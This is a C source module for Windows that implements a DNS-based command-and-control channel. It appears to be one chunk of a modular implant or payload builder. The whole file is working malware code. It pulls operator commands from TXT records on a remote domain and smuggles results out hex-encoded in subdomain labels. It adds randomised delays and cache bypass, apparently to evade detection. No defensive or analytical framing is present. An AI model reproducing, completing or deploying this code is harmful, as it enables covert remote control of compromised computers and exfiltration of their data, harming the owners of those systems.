// chunk: c2/dns_c2
// depends: core/emit_buffer
// provides: c2_connect, c2_recv_cmd, c2_send_result, c2_disconnect
// headers: windows.h, windns.h
// libs: dnsapi
// note: DNS TXT record C2 — command in TXT, response encoded in subdomain labels

#ifndef CHUNK_C2_DNS
#define CHUNK_C2_DNS

#include <windns.h>

static char g_dns_domain[256];
static char g_dns_id[32];

static int c2_connect(const char *host, int port) {
    (void)port;
    strncpy(g_dns_domain, host, sizeof(g_dns_domain) - 1);
    DWORD tick = GetTickCount();
    snprintf(g_dns_id, sizeof(g_dns_id), "%08lx", tick);
    return 1;
}

static int c2_recv_cmd(char *buf, int buf_sz) {
    char qname[512];
    snprintf(qname, sizeof(qname), "%s.cmd.%s", g_dns_id, g_dns_domain);

    wchar_t wqname[512];
    MultiByteToWideChar(CP_UTF8, 0, qname, -1, wqname, 512);

    PDNS_RECORD records = NULL;
    DNS_STATUS status = DnsQuery_W(wqname, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE,
                                    NULL, &records, NULL);
    if (status != ERROR_SUCCESS || !records)
        return 0;

    int total = 0;
    PDNS_RECORD r = records;
    while (r) {
        if (r->wType == DNS_TYPE_TEXT && r->Data.TXT.dwStringCount > 0) {
            for (DWORD i = 0; i < r->Data.TXT.dwStringCount; i++) {
                int slen = (int)wcslen(r->Data.TXT.pStringArray[i]);
                int copied = WideCharToMultiByte(CP_UTF8, 0,
                    r->Data.TXT.pStringArray[i], slen,
                    buf + total, buf_sz - total - 1, NULL, NULL);
                if (copied > 0) total += copied;
            }
        }
        r = r->pNext;
    }
    buf[total] = '\0';
    DnsRecordListFree(records, DnsFreeRecordListDeep);
    return total;
}

static int c2_send_result(const char *data, int len) {
    int chunk_sz = 60;
    int seq = 0;

    for (int off = 0; off < len; off += chunk_sz, seq++) {
        int n = (len - off < chunk_sz) ? len - off : chunk_sz;
        char hex[128];
        for (int i = 0; i < n && i * 2 + 1 < (int)sizeof(hex); i++)
            snprintf(hex + i * 2, 3, "%02x", (unsigned char)data[off + i]);

        char qname[512];
        snprintf(qname, sizeof(qname), "%s.%04d.%s.rsp.%s",
                 hex, seq, g_dns_id, g_dns_domain);

        wchar_t wqname[512];
        MultiByteToWideChar(CP_UTF8, 0, qname, -1, wqname, 512);

        PDNS_RECORD records = NULL;
        DnsQuery_W(wqname, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE,
                   NULL, &records, NULL);
        if (records)
            DnsRecordListFree(records, DnsFreeRecordListDeep);
        Sleep(50 + (GetTickCount() % 100));
    }
    return len;
}

static void c2_disconnect(void) {
    char qname[512];
    snprintf(qname, sizeof(qname), "%s.fin.%s", g_dns_id, g_dns_domain);
    wchar_t wqname[512];
    MultiByteToWideChar(CP_UTF8, 0, qname, -1, wqname, 512);
    PDNS_RECORD records = NULL;
    DnsQuery_W(wqname, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE,
               NULL, &records, NULL);
    if (records)
        DnsRecordListFree(records, DnsFreeRecordListDeep);
}

#endif
